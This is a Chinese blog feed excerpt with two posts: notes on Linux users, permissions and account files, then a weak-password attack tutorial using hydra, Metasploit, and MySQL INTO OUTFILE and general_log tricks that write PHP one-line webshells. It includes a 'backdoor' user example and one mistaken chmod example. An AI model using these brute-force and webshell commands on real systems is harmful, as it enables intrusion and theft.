        <content type="html"><![CDATA[<p>本篇博客主要介绍了和linux用户及权限的相关内容，权限的东西经常弄混，记一下！</p><a id="more"></a><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><p>我们可以用<code>ls -l</code>查看详细信息</p><p>linux下的权限可分为三种：</p><ul><li>r表示读，数字表示为4。对文件来说表示可以读取此文件的实际内容，而对目录来说表示可以读取目录结构列表，即可以查看目录下的文件名和子目录名，注意仅仅是名字</li><li>w表示写，数字表示2。对文件来说可以编辑、添加或者是修改该文件的内容，但不包含删除该文件，而对目录来说表示具有更改该目录结构列表的权限，包括新建删除重命名移动文件或者文件夹</li><li>x表示执行，数字表示1。对文件来说表示该文件具有可以被系统执行的权限，而对目录来说表示用户可以进入该目录成为工作目录，如果用户对于某个目录不具有x权限，则无法切换到该目录下，也就无法执行该目录下的任何命令，即使具有该目录的r权限。</li></ul><img src="/2020/03/04/linux%E7%94%A8%E6%88%B7%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/TIM截图20200304230610.png" style="zoom:80%;"><p>以图<code>conf.d</code>为例：</p><ul><li>d代表是目录，-代表文件</li><li><code>rwx</code>代表文件或目录所有者的拥有的权限</li><li><code>r-x</code>代表文件或目录组群的拥有的权限</li><li><code>r-x</code>代表文件或目录其它人的拥有的权限</li><li>数字2代表 链接占用的节点个数，如果是目录则表示该目录所含子目录或文件的个数</li><li>第一个root表示文件或目录所有者</li><li>第二个root代表文件或目录所属组</li><li>4096代表的是文件或文件夹的大小，单位字节</li><li>然后就是时间了，这里显示的是最后修改时间</li></ul><h3 id="软连接和硬连接"><a href="#软连接和硬连接" class="headerlink" title="软连接和硬连接"></a>软连接和硬连接</h3><p>linux系统中有种文件是链接文件，可以为解决文件的共享使用。链接的方式可以分为两种，一种是硬链接（Hard Link），另一种是软链接或者也称为符号链接（Symbolic Link）。</p><h4 id="硬连接"><a href="#硬连接" class="headerlink" title="硬连接"></a>硬连接</h4><p>硬链接是指通过索引节点来进行链接。在Linux的文件系统中，保存在磁盘分区中的文件不管是什么类型都会给它分配一个编号，这个编号被称为索引节点编号号(Inode Index)或者Inode，它是文件或者目录在一个文件系统中的唯一标识，文件的实际数据放置在数据区域（data block），它存储着文件重要参数信息，也就是元数据 （metadata），比如创建时间、修改时间、文件大小、属主、归属的用户组、读写权限、数据所在block号等，如下图所示。</p><img src="/2020/03/04/linux%E7%94%A8%E6%88%B7%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/824470-20180531151753197-400006785.png"><p> 在Linux系统中，多个文件名指向同一索引节点(Inode)是正常且允许的。一般这种链接就称为硬链接。硬链接的作用之一是允许一个文件拥有多个有效路径名，这样用户就可以建立硬链接到重要的文件，以防止“误删”源数据，不过硬链接只能在同一文件系统中的文件之间进行链接，不能对目录进行创建。之所以文件建立了硬链接就会防止数据误删，是因为文件系统的原理是，只要文件的索引节点还有一个以上的链接（仅删除了该文件的指向），只删除其中一个链接并不影响索引节点本身和其他的链接（数据的实体并未删除），只有当最后一个链接被删除后，此时如果有新数据要存储到磁盘上，被删除的文件的数据块及目录的链接才会被释放，空间被新数据暂用覆盖。</p><h4 id="软连接"><a href="#软连接" class="headerlink" title="软连接"></a>软连接</h4><p> 软链接（也叫符号链接），类似于windows系统中的快捷方式，与硬链接不同，软链接就是一个普通文件，只是数据块内容有点特殊，文件用户数据块中存放的内容是另一文件的路径名的指向，通过这个方式可以快速定位到软连接所指向的源文件实体。软链接可对文件或目录创建。</p><h4 id="ln命令"><a href="#ln命令" class="headerlink" title="ln命令"></a>ln命令</h4><p>n命令格式： </p><p> ln [参数] [源文件或目录] [目标文件或目录]</p><p>主要参数：</p><ul><li>-i 交互模式，文件存在则提示用户是否覆盖。</li><li>-s 软链接(符号链接)。</li><li>-d 允许超级用户制作目录的硬链接。</li><li>-b 删除，覆盖以前建立的链接</li></ul><ol><li>软链接 （符号链接） <code>ln -s  source target</code> </li><li>硬链接 （实体链接）<code>ln source  target</code></li></ol><h3 id="三种时间"><a href="#三种时间" class="headerlink" title="三种时间"></a>三种时间</h3><p>对于文件来说，三种时间有不同的含义：</p><ol><li>访问时间（atime：access time）：读一次文件的内容，atime就会更新。比如对这个文件运用 more、cat等命令。另外ls、stat命令都不会修改文件的访问时间。</li><li>修改时间（mtime：modifiy time）：mtime是文件内容最后一次被修改时间。例如vi后保存文件。ls -l列出的时间就是这个时间。</li><li>状态改动时间（ctime：change time）：ctime是在写入文件、更改所有者、权限或链接设置时随i节点的内容更改而更改的，是该文件的i节点最后一次被修改的时间，通过chmod、chown命令修改一次文件属性，这个时间就会更新。</li></ol><p>可以用<code>stat</code>命令查看三种时间，也可以用ls命令加参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -lc filename 列出文件的 ctime （最后状态更改时间） </span><br><span class="line">ls -lu filename 列出文件的 atime（最后访问时间） </span><br><span class="line">ls -l filename 列出文件的 mtime （最后修改时间）</span><br></pre></td></tr></table></figure><h3 id="三个重要文件"><a href="#三个重要文件" class="headerlink" title="三个重要文件"></a>三个重要文件</h3><h4 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h4><p>以下图为例</p><img src="/2020/03/04/linux%E7%94%A8%E6%88%B7%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/TIM截图20200305220338.png" style="zoom:80%;"><p><code>/etc/passwd</code>文件中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell</span><br></pre></td></tr></table></figure><ol><li><p>用户名(login_name):是代表用户账号的字符串。</p></li><li><p>口令(passwd):一些系统中，存放着加密后的用户口令字。虽然这个字段存放的只是用户口令的加密串，不是明文，但是由于/etc/passwd文件对所有用户都可读，所以这仍是一个安全隐患。因此，现在许多Linux系统（如SVR4）都使用了shadow技术，把真正的加密后的用户口令字存放到/etc/shadow文件中，而在/etc/passwd文件的口令字段中只存放一个特殊的字符，例如“x”或者“*”。</p></li><li><p>用户标识号(UID):是一个整数，系统内部用它来标识用户。一般情况下它与用户名是一一对应的。如果几个用户名对应的用户标识号是一样的，系统内部将把它们视为同一个用户，但是它们可以有不同的口令、不同的主目录以及不同的登录Shell等。取值范围是0-65535。0是超级用户root的标识号，1-99由系统保留，作为管理账号，普通用户的标识号从100开始。在Linux系统中，这个界限是500。</p></li><li><p>组标识号(GID):字段记录的是用户所属的用户组。它对应着/etc/group文件中的一条记录。</p></li><li><p>注释性描述(users):字段记录着用户的一些个人情况，例如用户的真实姓名、电话、地址等，这个字段并没有什么实际的用途。在不同的Linux系统中，这个字段的格式并没有统一。在许多Linux系统中，这个字段存放的是一段任意的注释性描述文字，用做finger命令的输出。</p></li><li><p>主目录(home_directory):也就是用户的起始工作目录，它是用户在登录到系统之后所处的目录。在大多数系统中，各用户的主目录都被组织在同一个特定的目录下，而用户主目录的名称就是该用户的登录名。各用户对自己的主目录有读、写、执行（搜索）权限，其他用户对此目录的访问权限则根据具体情况设置。</p></li><li><p>登录Shell(Shell):用户登录后，要启动一个进程，负责将用户的操作传给内核，这个进程是用户登录到系统后运行的命令解释器或某个特定的程序，即Shell。Shell是用户与Linux系统之间的接口。Linux的Shell有许多种，每种都有不同的特点。常用的有sh(BourneShell),csh(CShell),ksh(KornShell),tcsh(TENEX/TOPS-20typeCShell),bash(BourneAgainShell)等。系统管理员可以根据系统情况和用户习惯为用户指定某个Shell。如果不指定Shell，那么系统使用sh为默认的登录Shell，即这个字段的值为/bin/sh。</p></li></ol><p>我们可以看到系统中还有一些默认的帐号，如daemon、bin等。这些帐号有着特殊的用途，一般用于进行系统管理。这些帐号的口令大部分用（x）号表示，代表它们不能在登录时使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bin拥有可执行的用户命令文件 </span><br><span class="line">sys拥有系统文件 </span><br><span class="line">adm拥有帐户文件 </span><br><span class="line">uucpUUCP使用 </span><br><span class="line">lplp或lpd子系统使用 </span><br><span class="line">nobodyNFS使用</span><br></pre></td></tr></table></figure><p>了上面列出的伪用户外，还有许多标准的伪用户，例如：audit,cron,mail,usenet等，它们也都各自为相关的进程和文件所需要。</p><h4 id="etc-group"><a href="#etc-group" class="headerlink" title="/etc/group"></a>/etc/group</h4><img src="/2020/03/04/linux%E7%94%A8%E6%88%B7%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/TIM截图20200305222550.png" style="zoom: 67%;"><p>/etc/group 文件是用户组的配置文件，内容包括用户和用户组，并且能显示出用户是归属哪个用户组或哪几个用户组，因为一个用户可以归属一个或多个不同的用户组；同一用 户组的用户之间具有相似的特征。比如我们把某一用户加入到root用户组，那么这个用户就可以浏览root用户家目录的文件，如果root用户把某个文件 的读写执行权限开放，root用户组的所有用户都可以修改此文件，如果是可执行的文件（比如脚本），root用户组的用户也是可以执行的。</p><p>在/etc/group 中的每条记录分四个字段：<br>第一字段：用户组名称；<br>第二字段：用户组密码；<br>第三字段：GID<br>第四字段：用户列表，每个用户之间用,号分割；本字段可以为空；如果字段为空表示用户组为GID的用户名；</p><h4 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h4><p>如下例子：</p><img src="/2020/03/04/linux%E7%94%A8%E6%88%B7%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/TIM截图20200305221647.png" style="zoom:80%;"><p>第一列为账户名称</p><p>第二列为密码（账户未设置密码时为!!，设置密码后加密显示）</p><p>第三列为上次修改密码的时间距离1970年01月01日多少天</p><p>第四列为密码最短有效天数，0表示无限制</p><p>第五列为密码最长有效天数（默认位99999天，可以理解为永不过期）</p><p>第六列为密码过期后的宽限天数（密码过期后，预留几天给账号修改密码，此时已无法使用旧密码登录）</p><p>第八列为账户失效日期（从1970年01月01日起多少天后账户失效）</p><p>第九列暂时保留未使用</p><p>由示例可知，加密的密码具有固定格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id$salt$encrypted</span><br></pre></td></tr></table></figure><p>id表示加密算法，1代表<code>MD5</code>，5代表<code>SHA-256</code>，6代表<code>SHA-512</code> salt表示密码学中的Salt,系统随机生成 encrypted表示密码的hash</p><h3 id="三个重要命令"><a href="#三个重要命令" class="headerlink" title="三个重要命令"></a>三个重要命令</h3><h4 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h4><p>Linux/Unix 的文件调用权限分为三级 : 文件拥有者、群组、其他。利用 chmod 可以藉以控制文件如何被他人所调用。</p><p><strong>使用权限</strong> : 所有使用者</p><h5 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod [-cfvR] [--help] [--version] mode file...</span><br></pre></td></tr></table></figure><h5 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h5><p>mode : 权限设定字串，格式如下 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ugoa...][[+-&#x3D;][rwxX]...][,...]</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li>u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。</li><li>+ 表示增加权限、- 表示取消权限、= 表示唯一设定权限。</li><li>r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该文件是个子目录或者该文件已经被设定过为可执行。</li></ul><h5 id="其他参数说明"><a href="#其他参数说明" class="headerlink" title="其他参数说明"></a>其他参数说明</h5><ul><li>-c : 若该文件权限确实已经更改，才显示其更改动作</li><li>-f : 若该文件权限无法被更改也不要显示错误讯息</li><li>-v : 显示权限变更的详细资料</li><li>-R : 对目前目录下的所有文件与子目录进行相同的权限变更(即以递回的方式逐个变更)</li><li>–help : 显示辅助说明</li><li>–version : 显示版本</li></ul><h4 id="chown"><a href="#chown" class="headerlink" title="chown"></a>chown</h4><p>Linux/Unix 是多人多工操作系统，所有的文件皆有拥有者。利用 chown 将指定文件的拥有者改为指定的用户或组，用户可以是用户名或者用户ID；组可以是组名或者组ID；文件是以空格分开的要改变权限的文件列表，支持通配符。 。</p><p>一般来说，这个指令只有是由系统管理者(root)所使用，一般使用者没有权限可以改变别人的文件拥有者，也没有权限可以自己的文件拥有者改设为别人。只有系统管理者(root)才有这样的权限。</p><p><strong>使用权限</strong> : root</p><h5 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown [-cfhvR] [--help] [--version] user[:group] file...</span><br></pre></td></tr></table></figure><h5 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h5><ul><li>user : 新的文件拥有者的使用者 ID</li><li>group : 新的文件拥有者的使用者群体(group)</li><li>-c : 若该文件拥有者确实已经更改，才显示其更改动作</li><li>-f : 若该文件拥有者无法被更改也不要显示错误讯息</li><li>-h : 只对于连结(link)进行变更，而非该 link 真正指向的文件</li><li>-v : 显示拥有者变更的详细资料</li><li>-R : 对目前目录下的所有文件与子目录进行相同的拥有者变更(即以递回的方式逐个变更)</li><li>–help : 显示辅助说明</li><li>–version : 显示版本</li></ul><h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><p>将文件 file1.txt 的拥有者设为 users 群体的使用者 jessie :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown jessie:users file1.txt</span><br></pre></td></tr></table></figure><p>将目前目录下的所有文件与子目录的拥有者皆设为 users 群体的使用者 lamport :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R lamport:users *</span><br></pre></td></tr></table></figure><h4 id="chgrp"><a href="#chgrp" class="headerlink" title="chgrp"></a>chgrp</h4><p>Linux chgrp命令用于变更文件或目录的所属群组。</p><p>在UNIX系统家族里，文件或目录权限的掌控以拥有者及所属群组来管理。您可以使用chgrp指令去变更文件与目录的所属群组，设置方式采用群组名称或群组识别码皆可。</p><h5 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chgrp [-cfhRv][--help][--version][所属群组][文件或目录...] 或 chgrp [-cfhRv][--help][--reference&#x3D;&lt;参考文件或目录&gt;][--version][文件或目录...]</span><br></pre></td></tr></table></figure><h5 id="参数说明-1"><a href="#参数说明-1" class="headerlink" title="参数说明"></a>参数说明</h5><p>-c或–changes 效果类似”-v”参数，但仅回报更改的部分。</p><p>-f或–quiet或–silent 　不显示错误信息。</p><p>-h或–no-dereference 　只对符号连接的文件作修改，而不更动其他任何相关文件。</p><p>-R或–recursive 　递归处理，将指定目录下的所有文件及子目录一并处理。</p><p>-v或–verbose 　显示指令执行过程。</p><p>–help 　在线帮助。</p><p>–reference=&lt;参考文件或目录&gt; 　把指定文件或目录的所属群组全部设成和参考文件或目录的所属群组相同。</p><p>–version 　显示版本信息。</p><h5 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h5><p>实例1：改变文件的群组属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chgrp -v bin log2012.log</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost test]# ll</span><br><span class="line">---xrw-r-- 1 root root 302108 11-13 06:03 log2012.log</span><br><span class="line">[root@localhost test]# chgrp -v bin log2012.log</span><br></pre></td></tr></table></figure><p>“log2012.log” 的所属组已更改为 bin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost test]# ll</span><br><span class="line">---xrw-r-- 1 root bin  302108 11-13 06:03 log2012.log</span><br></pre></td></tr></table></figure><p>说明： 将log2012.log文件由root群组改为bin群组</p><p>实例2：根据指定文件改变文件的群组属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chgrp --reference&#x3D;log2012.log log2013.log</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost test]# ll</span><br><span class="line">---xrw-r-- 1 root bin  302108 11-13 06:03 log2012.log</span><br><span class="line">-rw-r--r-- 1 root root     61 11-13 06:03 log2013.log</span><br><span class="line">[root@localhost test]#  chgrp --reference&#x3D;log2012.log log2013.log </span><br><span class="line">[root@localhost test]# ll</span><br><span class="line">---xrw-r-- 1 root bin  302108 11-13 06:03 log2012.log</span><br><span class="line">-rw-r--r-- 1 root bin      61 11-13 06:03 log2013.log</span><br></pre></td></tr></table></figure><p>说明： 改变文件log2013.log 的群组属性，使得文件log2013.log的群组属性和参考文件log2012.log的群组属性相同</p><h3 id="一些常用的命令"><a href="#一些常用的命令" class="headerlink" title="一些常用的命令"></a>一些常用的命令</h3><p><strong>创建一个用户</strong></p><p>创建一个名为shell的用户，不创建家目录，shell为<code>/bin/bash</code>，指定UID号为8888，注释为backdoor</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -c <span class="string">&quot;backdoor&quot;</span> -M -s /bin/bash -u 8888 shell</span><br></pre></td></tr></table></figure><p>详细参数信息：</p><table><thead><tr><th align="center">-g</th><th align="center">指定所属组</th></tr></thead><tbody><tr><td align="center">-u</td><td align="center">指定UID号</td></tr><tr><td align="center">-s</td><td align="center">指定登录的shell</td></tr><tr><td align="center">-d</td><td align="center">指定家目录</td></tr><tr><td align="center">-G</td><td align="center">指定属于多个组（附属组）</td></tr><tr><td align="center">-M</td><td align="center">指定不创建家目录</td></tr><tr><td align="center">-m</td><td align="center">指定创建家目录</td></tr><tr><td align="center">-e</td><td align="center">账号终止日期，日期指定的格式为MM/DD/YY</td></tr><tr><td align="center">-f</td><td align="center">账号过期几日后永久停权。当值为0时账号立即停权，为-1时则关闭此功能，预设值为-1。</td></tr><tr><td align="center">-c</td><td align="center">注释</td></tr></tbody></table><p><strong>删除用户</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userdel -r admin</span><br></pre></td></tr></table></figure><ul><li>-r  删除主目录和邮件池</li><li>-f  强制删除，即使登录中</li></ul><p><strong>更改密码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 123123|passwd --stdin useradmin -n 3 -x 30 -w 7 -i 5</span><br></pre></td></tr></table></figure><p>非交互式修改密码为123123，3天内不能更改密码，30天后要求更改密码，密码过期前7天提醒，密码过期后5天禁用账号。</p><p>参数：</p><table><thead><tr><th>-l</th><th>锁定用户</th></tr></thead><tbody><tr><td>-U</td><td>解除用户锁定</td></tr><tr><td>-d</td><td>删除用户密码</td></tr><tr><td>-S （大写）</td><td>查看用户状态</td></tr><tr><td>-n</td><td>表示多少天内不能更改密码</td></tr><tr><td>-x</td><td>表示多少天以后要求更改密码</td></tr><tr><td>-w</td><td>表示账户密码过期前多少天提醒</td></tr><tr><td>-i</td><td>表示密码过期后多少天账号被禁用</td></tr><tr><td>–stdin</td><td>非交互式修改密码</td></tr></tbody></table><p><strong>更改登陆shell</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /bin/bash apache</span><br></pre></td></tr></table></figure><p>更改apache用户登录shell为<code>/bin/bash</code></p><p>参数：</p><ul><li>-s    指定登录shell</li><li>-l     打印shell列表并退出</li></ul><p><strong>who命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">who -b    #列出上次系统启动时间</span><br><span class="line">who -q    #列出所有已登录用户的用户名与用户数量</span><br><span class="line">who -u    #列出已登录的用户</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://www.cnblogs.com/songgj/p/9115954.html">https://www.cnblogs.com/songgj/p/9115954.html</a></p><p><a href="https://blog.csdn.net/a1154490629/article/details/52190801">https://blog.csdn.net/a1154490629/article/details/52190801</a></p><p><a href="https://ipcmen.com/">https://ipcmen.com</a></p><p><a href="https://blog.csdn.net/weixin_34010566/article/details/93026151">https://blog.csdn.net/weixin_34010566/article/details/93026151</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>远程弱口令攻击学习</title>
      <link href="2020/02/26/%E8%BF%9C%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/02/26/%E8%BF%9C%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了弱口令攻击的一些方式！</p><a id="more"></a><h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><h3 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -w 10 -P pass.txt -t 10 -v -f 127.0.0.1 ftp </span><br></pre></td></tr></table></figure><p>参数解释：</p><ol><li><p><code>-l root</code>     指定爆破账号为root</p></li><li><p><code>-w 10</code>     指定每个线程的回应时间为10S</p></li><li><p><code>-P pwd.txt</code> 指定密码字典为pwd.txt</p></li><li><p><code>-t 10</code>      指定爆破线程为10个</p></li><li><p><code>-v</code>        指定显示爆破过程</p></li><li><p><code>-f</code>        查找到第一个可以使用的ID和密码的时候停止破解</p></li></ol><h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>可以先使用<code>auxiliary/scanner/ftp/ftp_version</code>对版本进行探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ftp/ftp_version</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.0.1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><img src="/2020/02/26/%E8%BF%9C%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200228151826.png" style="zoom:80%;"><p>可以看到探测出是开放的，并获取到了ftp的banner信息</p><p>破解密码可以使用<code>auxiliary/scanner/ftp/ftp_login</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ftp/ftp_login</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.1.1</span><br><span class="line"><span class="built_in">set</span> PASS_FILE /root/Desktop/pass.txt</span><br><span class="line"><span class="built_in">set</span> USERPASS_FILE /root/Desktop/name.txt</span><br><span class="line"><span class="built_in">set</span> THREADS 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><h3 id="hydra-1"><a href="#hydra-1" class="headerlink" title="hydra"></a>hydra</h3><p>同样和ftp类似</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -w 10 -P pass.txt -t 10 -v -f 127.0.0.1 ssh</span><br></pre></td></tr></table></figure><h3 id="msf-1"><a href="#msf-1" class="headerlink" title="msf"></a>msf</h3><p>可以用<code>auxiliary/scanner/ssh/ssh_enumusers</code>这个模块枚举用户</p><p>可以用<code>auxiliary/scanner/ssh/ssh_login</code>这个暴力破解</p><p>用<code>auxiliary/scanner/ssh/ssh_version</code>探测版本</p><p>用<code>auxiliary/scanner/ssh/ssh_login_pubkey</code>进行公钥破解</p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="hydra-2"><a href="#hydra-2" class="headerlink" title="hydra"></a>hydra</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -w 10 -P pass.txt -t 10 -v -f 127.0.0.1 mysql</span><br></pre></td></tr></table></figure><h3 id="msf-2"><a href="#msf-2" class="headerlink" title="msf"></a>msf</h3><p>使用<code>auxiliary/scanner/mysql/mysql_version</code>可以探测版本</p><p>使用<code>auxiliary/admin/mysql/mysql_enum</code>可以获取数据库版本，操作系统名称，架构，数据库目录，数据库用户以及密码哈希值</p><p>使用<code>auxiliary/scanner/mysql/mysql_login</code>破解</p><p>使用<code>auxiliary/scanner/mysql/mysql_hashdump</code>进行mysql哈希值枚举</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_hashdump</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line"><span class="built_in">set</span> password root</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>使用<code>auxiliary/admin/mysql/mysql_sql</code>可以连接mysql类似于sqlmap里的–sql-shell</p><p>使用<code>auxiliary/scanner/mysql/mysql_schemadump</code>可以将数据库导出到本地</p><p>使用<code>auxiliary/scanner/mysql/mysql_file_enum</code>进行文件枚举</p><p>使用<code>auxiliary/scanner/mysql/mysql_writable_dirs</code>进行可写目录枚举</p><h3 id="mysql攻击方法"><a href="#mysql攻击方法" class="headerlink" title="mysql攻击方法"></a>mysql攻击方法</h3><h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h4><p>一些网站源代码文件中会包含数据库连接文件，通过查看这些文件可以获取数据库账号和密码。一般常见的数据库连接文件为<code>config.php</code>、<code>web.config</code>、<code>conn.asp</code>、<code>db.php/asp</code>、<code>jdbc.properties</code>、<code>sysconfig.properties</code>、<code>JBOSS_HOME\docs\examples\jca\XXXX-ds.xml</code>等等。</p><p>使用ultraedit等编辑文件编辑数据库配置文件后，会留下bak文件</p><h4 id="mysql写马"><a href="#mysql写马" class="headerlink" title="mysql写马"></a>mysql写马</h4><p>前提需要知道网站的真实物理路径，例如呼求偶真实路径<code>D:\work\WWW</code>，则可以通过执行以下查询，来获取一句话后门文件<code>cmd.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39;INTO OUTFILE &#39;D:&#x2F;work&#x2F;WWW&#x2F;shell.php&#39;</span><br></pre></td></tr></table></figure><p>当然我们可以用16进制形式写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select unhex(&#39;十六进制字符串不用0x&#39;) into dumpfile &#39;D:&#x2F;WEB&#x2F;shell.php&#39;</span><br></pre></td></tr></table></figure><p><strong>general_log_file写马</strong></p><p>（1）查看genera文件配置情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show <span class="keyword">global</span> variables like <span class="string">&quot;%genera%&quot;</span>;</span><br></pre></td></tr></table></figure><p>（2）关闭general_log</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log=off;</span><br></pre></td></tr></table></figure><p>（3）通过general_log选项来获取webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log=<span class="string">&#x27;on&#x27;</span>;</span><br><span class="line">SET <span class="keyword">global</span> general_log_file=<span class="string">&#x27;D:/phpStudy/WWW/cmd.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p>在查询中执行语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT <span class="string">&#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>Shell为cmd.php，一句话后门，密码为cmd。</p><h2 